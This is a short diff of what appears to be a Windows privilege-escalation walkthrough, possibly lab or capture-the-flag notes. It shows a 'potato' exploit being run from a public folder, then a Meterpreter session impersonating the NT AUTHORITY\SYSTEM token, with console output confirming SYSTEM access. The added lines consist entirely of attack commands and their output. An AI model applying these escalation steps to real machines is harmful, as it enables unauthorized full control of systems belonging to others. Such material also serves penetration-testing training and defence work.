@@ -53,4 +53,11 @@ cd C:\\Users\\Public
 
 execute -cH -f ./potato.exe
 
-impersonate_token "NT AUTHORITY\SYSTEM"
+meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[-] No delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
